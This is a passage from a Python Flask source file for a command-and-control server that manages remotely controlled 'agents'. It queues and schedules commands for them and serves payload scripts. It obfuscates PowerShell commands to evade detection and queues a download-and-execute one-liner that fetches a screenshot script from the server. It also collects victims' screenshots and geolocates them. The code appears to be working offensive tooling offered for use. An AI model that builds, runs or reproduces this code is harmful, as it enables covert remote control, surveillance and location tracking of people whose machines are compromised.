#!/usr/bin/env python3
"""
C2 Server with Geolocation Tracking

Geolocation Setup:
------------------
To enable geolocation tracking with AbstractAPI IP Intelligence:
1. Sign up at https://app.abstractapi.com/users/signup
2. Get your API key from the dashboard
3. Set the environment variable: export ABSTRACTAPI_KEY="your_api_key_here"
   Or on Windows: set ABSTRACTAPI_KEY=your_api_key_here
   Or in PowerShell: $env:ABSTRACTAPI_KEY="your_api_key_here"

The geolocation module will automatically:
- Fetch location data when agents register
- Update location data when agents send geolocation updates
- Display live locations on an interactive map
- Show location status with color-coded markers (green=recent, yellow=recent, red=old)
"""

from flask import Flask, request, jsonify, send_from_directory, render_template
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
from werkzeug.utils import secure_filename
import os
import time
import platform
import base64
import socket
import random
import string
import re
from datetime import datetime, timedelta
import json
import traceback
import mimetypes
import requests

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
# Configure upload folder for screenshots
app.config['UPLOAD_FOLDER'] = os.path.join(os.getcwd(), 'uploads')
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Debug: Print current working directory and uploads path
print(f"DEBUG: Current working directory: {os.getcwd()}")
print(f"DEBUG: Uploads folder: {app.config['UPLOAD_FOLDER']}")
print(f"DEBUG: Uploads folder exists: {os.path.exists(app.config['UPLOAD_FOLDER'])}")
print(f"DEBUG: Uploads folder is directory: {os.path.isdir(app.config['UPLOAD_FOLDER'])}")
db = SQLAlchemy(app)

class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(80), unique=True)
    os = db.Column(db.String(50))
    ip = db.Column(db.String(50))
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    location = db.Column(db.String(100))

class CommandQueue(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(80))
    command = db.Column(db.Text)
    schedule = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Result(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(80))
    output = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class ScheduledCommand(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(80))
    command = db.Column(db.Text)
    obfuscated_command = db.Column(db.Text)
    schedule_type = db.Column(db.String(20))  # 'once', 'daily', 'hourly', 'custom'
    schedule_time = db.Column(db.DateTime)
    cron_expression = db.Column(db.String(100))
    is_active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_run = db.Column(db.DateTime)
    next_run = db.Column(db.DateTime)

class Geolocation(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(80))
    ip = db.Column(db.String(50))
    country = db.Column(db.String(100))
    region = db.Column(db.String(100))
    city = db.Column(db.String(100))
    latitude = db.Column(db.Float)
    longitude = db.Column(db.Float)
    timezone = db.Column(db.String(50))
    isp = db.Column(db.String(100))
    last_updated = db.Column(db.DateTime, default=datetime.utcnow)

class UploadedFile(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(80))
    original_filename = db.Column(db.String(255))
    stored_filename = db.Column(db.String(255))
    file_path = db.Column(db.String(500))
    file_size = db.Column(db.BigInteger)
    file_type = db.Column(db.String(100))
    upload_timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    description = db.Column(db.Text)
    tags = db.Column(db.String(500))  # Comma-separated tags
    is_processed = db.Column(db.Boolean, default=False)
    processing_status = db.Column(db.String(50), default='pending')  # pending, processing, completed, failed

# Command Obfuscation Functions
def obfuscate_powershell_command(command, technique='base64'):
    """Obfuscate PowerShell commands using various techniques"""
    if technique == 'base64':
        # Base64 encoding with Invoke-Expression
        encoded = base64.b64encode(command.encode('utf-16le')).decode('ascii')
        return f'powershell -enc "{encoded}"'
    
    elif technique == 'string_manipulation':
        # String manipulation with variables
        var_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        parts = []
        for char in command:
            parts.append(f'[char]{ord(char)}')
        return f'$c={"+".join(parts)};iex $c'
    
    elif technique == 'unicode_escape':
        # Unicode escape sequences
        encoded = base64.b64encode(command.encode('utf-16le')).decode('ascii')
        return f'powershell -Command "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\'{encoded}\')) | iex"'
    
    elif technique == 'variable_substitution':
        # Variable substitution with random names - fixed syntax
        var_names = [''.join(random.choices(string.ascii_lowercase, k=6)) for _ in range(2)]
        return f'${var_names[0]}="{command}";${var_names[1]}=iex;${var_names[1]} ${var_names[0]}'
    
    elif technique == 'reverse_string':
        # Reverse string technique
        reversed_cmd = command[::-1]
        var_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        return f'powershell -Command "${var_name}=\'{reversed_cmd}\';iex (-join ${var_name}[-1..-${var_name}.length])"'
    
    else:
        return command

def get_obfuscation_techniques():
    """Return available obfuscation techniques"""
    return [
        {'id': 'none', 'name': 'No Obfuscation', 'description': 'Execute command as-is'},
        {'id': 'base64', 'name': 'Base64 Encoding', 'description': 'Encode command in base64'},
        {'id': 'string_manipulation', 'name': 'String Manipulation', 'description': 'Use character codes and variables'},
        {'id': 'unicode_escape', 'name': 'Unicode Escape', 'description': 'Unicode escape sequences'},
        {'id': 'variable_substitution', 'name': 'Variable Substitution', 'description': 'Random variable names'},
        {'id': 'reverse_string', 'name': 'Reverse String', 'description': 'Reverse and reconstruct command'}
    ]

@app.route('/payloads')
def payloads_page():
    return render_template("payloads.html")

@app.route('/screenshots')
def screenshots_page():
    return render_template('screenshots.html')

@app.route('/obfuscator')
def obfuscator_page():
    return render_template('obfuscator.html')

@app.route('/scheduler')
def scheduler_page():
    return render_template('scheduler.html')

@app.route('/geolocation')
def geolocation_page():
    return render_template('geolocation.html')



@app.route('/screenshot/<hostname>', methods=['POST'])
def screenshot(hostname):
    try:
        data = request.json
        img_data = base64.b64decode(data['image'])
        
        # Use custom filename if provided, otherwise generate one
        if 'filename' in data:
            filename = data['filename']
        else:
            timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
            random_num = random.randint(100000, 999999)
            filename = f"{hostname}_{random_num}_{timestamp}_screenshot.png"
        
        # Ensure filename is safe and has .png extension
        if not filename.lower().endswith('.png'):
            filename = filename + '.png'
        
        # Save the screenshot
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        with open(file_path, 'wb') as f:
            f.write(img_data)
        
        print(f"DEBUG: Screenshot saved as {filename} for hostname {hostname}")
        return jsonify({'message': 'Screenshot saved successfully', 'filename': filename})
        
    except Exception as e:
        print(f"DEBUG: Error saving screenshot: {e}")
        return jsonify({'error': f'Failed to save screenshot: {str(e)}'}), 500

@app.route('/results/<hostname>', methods=['DELETE'])
def clear_results(hostname):
    Result.query.filter_by(hostname=hostname).delete()
    db.session.commit()
    return 'Cleared', 200

@app.route('/')
def index():
    return render_template("dashboard.html")

@app.route('/ui')
def serve_ui():
    return render_template('app.html')

@app.route('/agents')
def agents_page():
    """Standalone agents page for consistency with other pages"""
    return render_template('agents.html')

@app.route('/api/payloads', methods=['GET'])
def api_payloads():
    """List source payload template files"""
    try:
        payload_dir = 'payloads'
        if not os.path.exists(payload_dir):
            return jsonify([])
        
        payloads = []
        for file in os.listdir(payload_dir):
            if file.endswith(('.ps1', '.sh', '.bat', '.py')) and not file.startswith('.'):
                payloads.append(file)
        
        return jsonify(sorted(payloads))
    except Exception as e:
        print(f"Error listing source payloads: {e}")
        return jsonify([])

@app.route('/api/generated-payloads', methods=['GET'])
def api_generated_payloads():
    """List generated payload files with current IP"""
    try:
        payload_dir = 'payloads/generated'
        if not os.path.exists(payload_dir):
            return jsonify([])
        
        payloads = []
        for file in os.listdir(payload_dir):
            if file.endswith(('.ps1', '.sh', '.bat', '.py')) and not file.startswith('.'):
                payloads.append(file)
        
        return jsonify(sorted(payloads))
    except Exception as e:
        print(f"Error listing generated payloads: {e}")
        return jsonify([])

@app.route('/payloads/<path:filename>', methods=['GET'])
def get_payload(filename):
    payload_dir = 'payloads'
    gen_dir = os.path.join(payload_dir, 'generated')
    os.makedirs(gen_dir, exist_ok=True)
    clean_name = secure_filename(filename)
    original_path = os.path.join(payload_dir, clean_name)
    generated_path = os.path.join(gen_dir, clean_name)
    
    # Check if file exists in either location
    if not os.path.isfile(original_path) and not os.path.isfile(generated_path):
        return "Payload not found", 404
    
    # Handle PowerShell scripts
    if filename.endswith('.ps1'):
        c2_ip = get_lan_ip()
        c2_port = "8084"
        try:
            with open(original_path, 'r', encoding='utf-8') as f:
                content = f.read()
        except UnicodeDecodeError:
            with open(original_path, 'r', encoding='cp1252') as f:
                content = f.read()
        content = content.replace("{C2_HOST}", c2_ip).replace("{C2_PORT}", c2_port)
        with open(generated_path, 'w', encoding='utf-8') as f:
            f.write(content)
        return content, 200, {'Content-Type': 'text/plain'}
    
    # Handle shell scripts
    elif filename.endswith('.sh'):
        c2_ip = get_lan_ip()
        c2_port = "8084"
        
        # Try to read from generated directory first, then original
        if os.path.isfile(generated_path):
            try:
                with open(generated_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except UnicodeDecodeError:
                with open(generated_path, 'r', encoding='latin-1') as f:
                    content = f.read()
        else:
            try:
                with open(original_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except UnicodeDecodeError:
                with open(original_path, 'r', encoding='latin-1') as f:
                    content = f.read()
        
        # Replace C2 server details if placeholders exist
        content = content.replace("{C2_HOST}", c2_ip).replace("{C2_PORT}", c2_port)
        
        # Save to generated directory
        with open(generated_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return content, 200, {'Content-Type': 'text/plain'}
    
    # For other file types, serve directly
    if os.path.isfile(original_path):
        return send_from_directory(payload_dir, clean_name)
    else:
        return send_from_directory(gen_dir, clean_name)

@app.route('/generated/<path:filename>')
def download_generated_payload(filename):
    """Download a generated payload file with current IP"""
    generated_dir = os.path.join('payloads', 'generated')
    return send_from_directory(generated_dir, filename)

@app.route('/agent/<hostname>', methods=['DELETE'])
def delete_agent(hostname):
    agent = Agent.query.filter_by(hostname=hostname).first()
    if agent:
        # Also delete geolocation data for this agent
        geo = Geolocation.query.filter_by(hostname=hostname).first()
        if geo:
            db.session.delete(geo)
            print(f"DEBUG: Deleted geolocation data for {hostname}")
        
        db.session.delete(agent)
        db.session.commit()
        print(f"DEBUG: Deleted agent {hostname}")
        return 'Deleted', 200
    return 'Agent not found', 404

@app.route('/command/<hostname>', methods=['GET'])
def get_command(hostname):
    # Update agent's last_seen timestamp (heartbeat) without overwriting other data
    agent = Agent.query.filter_by(hostname=hostname).first()
    if agent:
        # Debug: Log current agent data
        print(f"DEBUG: Heartbeat from {hostname} - Current IP: {agent.ip}, OS: {agent.os}")
        
        # Only update last_seen, preserve existing IP and OS
        agent.last_seen = datetime.utcnow()
        db.session.commit()
        
        print(f"DEBUG: Updated last_seen for {hostname}, IP still: {agent.ip}")
    else:
        print(f"DEBUG: Heartbeat from unknown hostname: {hostname}")
    
    cmd = CommandQueue.query.filter_by(hostname=hostname).order_by(CommandQueue.created_at).first()
    if cmd:
        if cmd.schedule == 0:
            db.session.delete(cmd)
        db.session.commit()
        return cmd.command
    return ''

def fetch_geolocation_from_abstractapi(ip):
    """Helper function to fetch geolocation data from AbstractAPI IP Intelligence"""
    if not ip or ip == 'Unknown' or ip.strip() == '':
        return None
    
    api_key = os.environ.get('ABSTRACTAPI_KEY')
    if not api_key:
        return None
    
    try:
        # Use AbstractAPI IP Intelligence endpoint
        api_url = f'https://ip-intelligence.abstractapi.com/v1/?api_key={api_key}&ip_address={ip}'
        response = requests.get(api_url, timeout=10)
        
        if response.status_code == 200:
            geo_info = response.json()
            
            # Map AbstractAPI IP Intelligence response fields
            # Note: latitude, longitude, city, country, region are nested in 'location' object
            location_data = geo_info.get('location', {})
            if location_data:
                country = location_data.get('country', 'Unknown')
                region = location_data.get('region', 'Unknown')
                city = location_data.get('city', 'Unknown')
                latitude = float(location_data.get('latitude', 0.0))
                longitude = float(location_data.get('longitude', 0.0))
            else:
                # Fallback to top-level (for backward compatibility)
                country = geo_info.get('country', 'Unknown')
                region = geo_info.get('region', 'Unknown')
                city = geo_info.get('city', 'Unknown')
                latitude = float(geo_info.get('latitude', 0.0))
                longitude = float(geo_info.get('longitude', 0.0))
            
            # Handle timezone (can be object or string)
            timezone = 'UTC'
            if geo_info.get('timezone'):
                if isinstance(geo_info.get('timezone'), dict):
                    timezone = geo_info.get('timezone', {}).get('name', 'UTC')
                else:
                    timezone = geo_info.get('timezone', 'UTC')
            
            # Handle ISP/Company (can be object or string)
            isp = 'Unknown'
            if geo_info.get('company'):
                if isinstance(geo_info.get('company'), dict):
                    isp = geo_info.get('company', {}).get('name', 'Unknown')
                else:
                    isp = geo_info.get('company', 'Unknown')
            elif geo_info.get('asn'):
                if isinstance(geo_info.get('asn'), dict):
                    isp = geo_info.get('asn', {}).get('name', 'Unknown')
                else:
                    isp = geo_info.get('asn', 'Unknown')
            elif geo_info.get('connection'):
                if isinstance(geo_info.get('connection'), dict):
                    isp = geo_info.get('connection', {}).get('isp', 'Unknown')
                else:
                    isp = geo_info.get('connection', 'Unknown')
            elif geo_info.get('isp'):
                isp = geo_info.get('isp', 'Unknown')
            
            return {
                'country': country,
                'region': region,
                'city': city,
                'latitude': latitude,
                'longitude': longitude,
                'timezone': timezone,
                'isp': isp
            }
        else:
            print(f"WARNING: AbstractAPI returned status code {response.status_code}: {response.text}")
    except Exception as e:
        print(f"DEBUG: Error fetching geolocation for {ip}: {str(e)}")
        import traceback
        traceback.print_exc()
    
    return None

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    hostname = data.get('hostname')
    ip = data.get('ip')
    os_info = data.get('os')
    
    print(f"DEBUG: Agent registration - Hostname: {hostname}, IP: {ip}, OS: {os_info}")
    print(f"DEBUG: Full request data: {data}")
    print(f"DEBUG: Data type of IP: {type(ip)}")
    print(f"DEBUG: IP value: '{ip}'")
    print(f"DEBUG: IP length: {len(str(ip)) if ip else 0}")
    print(f"DEBUG: IP is None: {ip is None}")
    print(f"DEBUG: IP is empty string: {ip == ''}")
    print(f"DEBUG: IP is whitespace: {ip == ' ' if ip else False}")
    
    # Check if IP is valid
    if ip and ip.strip():
        print(f"DEBUG: IP appears valid: '{ip.strip()}'")
        ip = ip.strip()  # Remove any whitespace
    else:
        print(f"DEBUG: IP is invalid or empty, setting to 'Unknown'")
        ip = 'Unknown'
    
    agent = Agent.query.filter_by(hostname=hostname).first()
    if not agent:
        print(f"DEBUG: Creating new agent: {hostname}")
        agent = Agent(
            hostname=hostname,
            ip=ip,
            os=os_info,
            last_seen=datetime.utcnow()
        )
        db.session.add(agent)
    else:
        print(f"DEBUG: Updating existing agent: {hostname} - Old IP: {agent.ip}, New IP: {ip}")
        agent.ip = ip
        agent.os = os_info
        agent.last_seen = datetime.utcnow()
    
    db.session.commit()
    print(f"DEBUG: Agent {hostname} saved with IP: {agent.ip}")
    
    # Automatically fetch geolocation if IP is valid
    if ip and ip != 'Unknown':
        try:
            geo_data = fetch_geolocation_from_abstractapi(ip)
            if geo_data:
                geo = Geolocation.query.filter_by(hostname=hostname).first()
                if not geo:
                    geo = Geolocation(hostname=hostname, ip=ip)
                
                geo.ip = ip
                geo.country = geo_data['country']
                geo.region = geo_data['region']
                geo.city = geo_data['city']
                geo.latitude = geo_data['latitude']
                geo.longitude = geo_data['longitude']
                geo.timezone = geo_data['timezone']
                geo.isp = geo_data['isp']
                geo.last_updated = datetime.utcnow()
                
                db.session.add(geo)
                
                # Also update Agent.location field for display in agents table
                location_string = f"{geo_data['city']}, {geo_data['region']}, {geo_data['country']}"
                agent.location = location_string
                
                db.session.commit()
                print(f"DEBUG: Auto-fetched geolocation for {hostname}: {geo_data['city']}, {geo_data['country']}")
        except Exception as e:
            print(f"DEBUG: Error auto-fetching geolocation: {str(e)}")
            # Don't fail registration if geolocation fails
    
    # Verify the data was actually saved
    saved_agent = Agent.query.filter_by(hostname=hostname).first()
    print(f"DEBUG: Verification - Saved agent IP: {saved_agent.ip}")
    
    return 'OK'

# New API endpoints for obfuscation, scheduling, and geolocation
@app.route('/api/obfuscate', methods=['POST'])
def obfuscate_command():
    """Obfuscate a command using specified technique"""
    data = request.json
    command = data.get('command')
    technique = data.get('technique', 'base64')
    
    if not command:
        return jsonify({'error': 'Command is required'}), 400
    
    obfuscated = obfuscate_powershell_command(command, technique)
    return jsonify({
        'original': command,
        'obfuscated': obfuscated,
        'technique': technique
    })

@app.route('/api/obfuscation-techniques', methods=['GET'])
def get_obfuscation_techniques_api():
    """Get available obfuscation techniques"""
    return jsonify(get_obfuscation_techniques())

@app.route('/api/schedule-command', methods=['POST'])
def schedule_command():
    """Schedule a command for execution"""
    try:
        data = request.json
        hostname = data.get('hostname')
        command = data.get('command')
        schedule_type = data.get('schedule_type', 'once')
        schedule_time = data.get('schedule_time')
        cron_expression = data.get('cron_expression')
        obfuscation_technique = data.get('obfuscation_technique', 'none')
        
        if not all([hostname, command]):
            return jsonify({'error': 'Hostname and command are required'}), 400
        
        # Obfuscate command if technique is specified
        obfuscated_command = command
        if obfuscation_technique != 'none':
            obfuscated_command = obfuscate_powershell_command(command, obfuscation_technique)
        
        # Calculate next run time and schedule_time
        next_run = None
        parsed_schedule_time = None
        
        if schedule_type == 'once':
            try:
                # Parse the datetime string from the frontend
                if schedule_time:
                    # Handle different datetime formats
                    if 'T' in schedule_time:
                        # Format: "2024-01-01T12:00"
                        parsed_schedule_time = datetime.fromisoformat(schedule_time)
                    else:
                        # Format: "2024-01-01 12:00:00"
                        parsed_schedule_time = datetime.strptime(schedule_time, '%Y-%m-%d %H:%M:%S')
                    
                    next_run = parsed_schedule_time
                else:
                    return jsonify({'error': 'Schedule time is required for one-time commands'}), 400
                    
            except ValueError as e:
                return jsonify({'error': f'Invalid schedule time format: {str(e)}'}), 400
                
        elif schedule_type == 'hourly':
            next_run = datetime.utcnow() + timedelta(hours=1)
            parsed_schedule_time = datetime.utcnow()
            
        elif schedule_type == 'daily':
            next_run = datetime.utcnow() + timedelta(days=1)
            parsed_schedule_time = datetime.utcnow()
            
        elif schedule_type == 'custom':
            if not cron_expression:
                return jsonify({'error': 'Cron expression is required for custom scheduling'}), 400
            # For custom cron, parse the expression to get the next run time
            try:
                next_run = parse_cron_expression(cron_expression)
                parsed_schedule_time = datetime.utcnow()
                print(f"Scheduled custom cron '{cron_expression}' for {hostname}, next run: {next_run}")
            except Exception as e:
                return jsonify({'error': f'Invalid cron expression: {str(e)}'}), 400
        
        # Create the scheduled command
        scheduled_cmd = ScheduledCommand(
            hostname=hostname,
            command=command,
            obfuscated_command=obfuscated_command,
            schedule_type=schedule_type,
            schedule_time=parsed_schedule_time,
            cron_expression=cron_expression,
            next_run=next_run
        )
        
        db.session.add(scheduled_cmd)
        db.session.commit()
        
        return jsonify({
            'message': 'Command scheduled successfully',
            'id': scheduled_cmd.id,
            'next_run': next_run.isoformat() if next_run else None,
            'schedule_time': parsed_schedule_time.isoformat() if parsed_schedule_time else None
        })
        
    except Exception as e:
        db.session.rollback()
        print(f"Error scheduling command: {str(e)}")
        return jsonify({'error': f'Failed to schedule command: {str(e)}'}), 500

@app.route('/api/scheduled-commands', methods=['GET'])
def get_scheduled_commands():
    """Get all scheduled commands"""
    commands = ScheduledCommand.query.filter_by(is_active=True).all()
    return jsonify([{
        'id': cmd.id,
        'hostname': cmd.hostname,
        'command': cmd.command,
        'obfuscated_command': cmd.obfuscated_command,
        'schedule_type': cmd.schedule_type,
        'schedule_time': cmd.schedule_time,
        'next_run': cmd.next_run.isoformat() if cmd.next_run else None,
        'is_active': cmd.is_active,
        'created_at': cmd.created_at.isoformat()
    } for cmd in commands])

@app.route('/api/scheduled-commands/<int:cmd_id>', methods=['DELETE'])
def delete_scheduled_command(cmd_id):
    """Delete a scheduled command"""
    cmd = ScheduledCommand.query.get(cmd_id)
    if cmd:
        cmd.is_active = False
        db.session.commit()
        return jsonify({'message': 'Command deleted successfully'})
    return jsonify({'error': 'Command not found'}), 404

@app.route('/api/geolocation/<hostname>', methods=['POST'])
def update_geolocation(hostname):
    """Update geolocation information for an agent - uses data sent by agent"""
    data = request.json
    print(f"DEBUG: Received geolocation update for {hostname}: {data}")
    
    ip = data.get('ip')
    if not ip:
        return jsonify({'error': 'IP address is required'}), 400
    
    try:
        # Use geolocation data sent by the agent (they already fetched it)
        geo_data = {
            'country': data.get('country', 'Unknown'),
            'region': data.get('region', 'Unknown'),
            'city': data.get('city', 'Unknown'),
            'latitude': float(data.get('latitude', 0.0)),
            'longitude': float(data.get('longitude', 0.0)),
            'timezone': data.get('timezone', 'UTC'),
            'isp': data.get('isp', 'Unknown')
        }
        
        print(f"DEBUG: Using geolocation data from agent: {geo_data}")
        
        # Update or create geolocation record
        geo = Geolocation.query.filter_by(hostname=hostname).first()
        if not geo:
            geo = Geolocation(hostname=hostname, ip=ip)
            print(f"DEBUG: Creating new geolocation record for {hostname}")
        else:
            print(f"DEBUG: Updating existing geolocation record for {hostname}")
        
        geo.ip = ip
        geo.country = geo_data['country']
        geo.region = geo_data['region']
        geo.city = geo_data['city']
        geo.latitude = geo_data['latitude']
        geo.longitude = geo_data['longitude']
        geo.timezone = geo_data['timezone']
        geo.isp = geo_data['isp']
        geo.last_updated = datetime.utcnow()
        
        db.session.add(geo)
        
        # Also update Agent.location field for display in agents table
        location_string = f"{geo_data['city']}, {geo_data['region']}, {geo_data['country']}"
        agent = Agent.query.filter_by(hostname=hostname).first()
        if agent:
            agent.location = location_string
            print(f"DEBUG: Updated Agent.location for {hostname} to: {location_string}")
        else:
            print(f"WARNING: Agent {hostname} not found in database")
        
        db.session.commit()
        print(f"DEBUG: Successfully updated geolocation for {hostname}: {location_string}")
        
        # Verify the data was saved
        saved_geo = Geolocation.query.filter_by(hostname=hostname).first()
        if saved_geo:
            print(f"DEBUG: Verification - Saved geolocation: {saved_geo.city}, {saved_geo.country}, Lat: {saved_geo.latitude}, Lon: {saved_geo.longitude}")
        else:
            print(f"ERROR: Geolocation was not saved to database for {hostname}")
        
        return jsonify({'message': 'Geolocation updated successfully', 'data': geo_data})
        
    except Exception as e:
        print(f"ERROR: Exception in update_geolocation: {str(e)}")
        import traceback
        traceback.print_exc()
        db.session.rollback()
        return jsonify({'error': f'Failed to update geolocation: {str(e)}'}), 500

@app.route('/api/geolocation/<hostname>', methods=['GET'])
def get_geolocation(hostname):
    """Get geolocation information for an agent"""
    geo = Geolocation.query.filter_by(hostname=hostname).first()
    if geo:
        return jsonify({
            'hostname': geo.hostname,
            'ip': geo.ip,
            'country': geo.country,
            'region': geo.region,
            'city': geo.city,
            'latitude': geo.latitude,
            'longitude': geo.longitude,
            'timezone': geo.timezone,
            'isp': geo.isp,
            'last_updated': geo.last_updated.isoformat()
        })
    return jsonify({'error': 'Geolocation not found'}), 404

@app.route('/api/geolocation', methods=['GET'])
def get_all_geolocations():
    """Get geolocation information for all agents"""
    geo_list = Geolocation.query.all()
    print(f"DEBUG: get_all_geolocations - Found {len(geo_list)} geolocation records")
    
    result = []
    for geo in geo_list:
        geo_data = {
            'hostname': geo.hostname,
            'ip': geo.ip,
            'country': geo.country or 'Unknown',
            'region': geo.region or 'Unknown',
            'city': geo.city or 'Unknown',
            'latitude': float(geo.latitude) if geo.latitude is not None else 0.0,
            'longitude': float(geo.longitude) if geo.longitude is not None else 0.0,
            'timezone': geo.timezone or 'UTC',
            'isp': geo.isp or 'Unknown',
            'last_updated': geo.last_updated.isoformat() if geo.last_updated else datetime.utcnow().isoformat()
        }
        result.append(geo_data)
        print(f"DEBUG: Returning geolocation for {geo.hostname}: {geo_data['city']}, {geo_data['country']}, Lat: {geo_data['latitude']}, Lon: {geo_data['longitude']}")
    
    print(f"DEBUG: Returning {len(result)} geolocation records")
    return jsonify(result)

@app.route('/api/debug/geolocation', methods=['GET'])
def debug_geolocation():
    """Debug endpoint to check geolocation data"""
    geo_list = Geolocation.query.all()
    agents = Agent.query.all()
    
    debug_info = {
        'total_geolocations': len(geo_list),
        'total_agents': len(agents),
        'geolocations': [{
            'hostname': geo.hostname,
            'ip': geo.ip,
            'city': geo.city,
            'country': geo.country,
            'latitude': float(geo.latitude) if geo.latitude is not None else None,
            'longitude': float(geo.longitude) if geo.longitude is not None else None,
            'last_updated': geo.last_updated.isoformat() if geo.last_updated else None
        } for geo in geo_list],
        'agents': [{
            'hostname': a.hostname,
            'ip': a.ip,
            'location': a.location
        } for a in agents]
    }
    
    return jsonify(debug_info)

# Enhanced command posting with obfuscation
@app.route('/command/<hostname>', methods=['POST'])
def post_command(hostname):
    data = request.json
    command = data.get('command')
    obfuscation_technique = data.get('obfuscation_technique', 'none')
    
    if obfuscation_technique != 'none':
        command = obfuscate_powershell_command(command, obfuscation_technique)
    
    cmd = CommandQueue(hostname=hostname, command=command)
    db.session.add(cmd)
    db.session.commit()
    return 'Command scheduled'

@app.route('/results/<hostname>')
def get_results(hostname):
    # Get results in ascending order (oldest first) so frontend can display chronologically
    results = Result.query.filter_by(hostname=hostname).order_by(Result.timestamp.asc()).limit(50).all()
    return jsonify([{
        'output': r.output,
        'timestamp': r.timestamp.strftime('%Y-%m-%d %H:%M:%S')
    } for r in results])

@app.route('/result/<hostname>', methods=['POST'])
def post_result(hostname):
    data = request.json
    res = Result(hostname=hostname, output=data.get('output'))
    db.session.add(res)
    db.session.commit()
    return 'OK'

@app.route('/api/agents', methods=['GET'])
def get_agents_api():
    """Get all agents with full details including coordinates"""
    now = datetime.utcnow()
    agents = Agent.query.all()
    result = []
    for a in agents:
        # Get latitude and longitude from Geolocation table
        latitude = None
        longitude = None
        geo = Geolocation.query.filter_by(hostname=a.hostname).first()
        if geo:
            latitude = float(geo.latitude) if geo.latitude is not None else None
            longitude = float(geo.longitude) if geo.longitude is not None else None
        
        # Format coordinates for display
        coordinates = 'Unknown'
        if latitude is not None and longitude is not None and latitude != 0 and longitude != 0:
            coordinates = f"{latitude:.4f}, {longitude:.4f}"
        
        result.append({
            'hostname': a.hostname,
            'ip': a.ip,
            'os': a.os,
            'latitude': latitude,
            'longitude': longitude,
            'coordinates': coordinates,
            'last_seen': a.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'Online' if (now - a.last_seen).total_seconds() < 15 else 'Offline'
        })
    return jsonify(result)

@app.route('/api/screenshot/<hostname>', methods=['POST'])
def queue_screenshot_command(hostname):
    """Queue a screenshot command for an agent"""
    try:
        # Check if agent exists
        agent = Agent.query.filter_by(hostname=hostname).first()
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        # Get the C2 server IP and port
        c2_ip = get_lan_ip()
        c2_port = "8084"  # Use the same port as the payload endpoint
        
        # Simple command to download and execute the screenshot script
        screenshot_command = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iwr http://{c2_ip}:{c2_port}/payloads/1ss.ps1 -UseBasicParsing | iex"'
        
        # Add screenshot command to queue
        screenshot_cmd = CommandQueue(
            hostname=hostname,
            command=screenshot_command,
            schedule=0
        )
        db.session.add(screenshot_cmd)
        db.session.commit()
        
        return jsonify({'message': f'Screenshot command queued for {hostname}'}), 200
        
    except Exception as e:
        return jsonify({'error': f'Failed to queue screenshot command: {str(e)}'}), 500

@app.route('/api/screenshots', methods=['GET'])
def get_screenshots():
    """Get list of all screenshots in the uploads directory"""
    try:
        screenshot_files = []
        upload_dir = app.config['UPLOAD_FOLDER']
        
        # Get absolute path for debugging
        abs_upload_dir = os.path.abspath(upload_dir)
        
        # Debug information
        print(f"DEBUG: Upload directory path: {upload_dir}")
        print(f"DEBUG: Absolute upload directory path: {abs_upload_dir}")
        print(f"DEBUG: Directory exists: {os.path.exists(upload_dir)}")
        print(f"DEBUG: Directory is directory: {os.path.isdir(upload_dir) if os.path.exists(upload_dir) else 'N/A'}")
        print(f"DEBUG: Current working directory: {os.getcwd()}")
        
        if os.path.exists(upload_dir) and os.path.isdir(upload_dir):
            try:
                files = os.listdir(upload_dir)
                print(f"DEBUG: Found {len(files)} files in directory")
                print(f"DEBUG: Files: {files}")
                
                for filename in files:
                    if filename.lower().endswith(('.png', '.jpg', '.jpeg')):
                        file_path = os.path.join(upload_dir, filename)
                        try:
                            file_stat = os.stat(file_path)
                            
                            # Extract agent name and timestamp from filename
                            agent_name = "Unknown"
                            timestamp = "Unknown"
                            
                            try:
                                # Try to extract agent name from filename
                                # Format: {hostname}_{YYYYMMDD}_{HHMMSS}_screenshot.png
                                # Or: {hostname}_screenshot.png
                                if "_screenshot" in filename:
                                    parts = filename.split("_screenshot")[0].split("_")
                                    if len(parts) >= 1:
                                        # First part is usually the hostname
                                        agent_name = parts[0]
                                        
                                        # Try to extract timestamp from filename (format: YYYYMMDD_HHMMSS)
                                        if len(parts) >= 3:
                                            try:
                                                date_part = parts[1]  # YYYYMMDD
                                                time_part = parts[2]   # HHMMSS
                                                if len(date_part) == 8 and len(time_part) == 6 and date_part.isdigit() and time_part.isdigit():
                                                    year = int(date_part[:4])
                                                    month = int(date_part[4:6])
                                                    day = int(date_part[6:8])
                                                    hour = int(time_part[:2])
                                                    minute = int(time_part[2:4])
                                                    second = int(time_part[4:6])
                                                    if (1900 <= year <= 2100 and 1 <= month <= 12 and 1 <= day <= 31 and
                                                        0 <= hour <= 23 and 0 <= minute <= 59 and 0 <= second <= 59):
                                                        timestamp = f"{year}-{month:02d}-{day:02d} {hour:02d}:{minute:02d}:{second:02d}"
                                            except (ValueError, IndexError):
                                                pass
                            except Exception as e:
                                print(f"DEBUG: Error parsing filename {filename}: {e}")
                            
                            # If no timestamp extracted, use file modification time
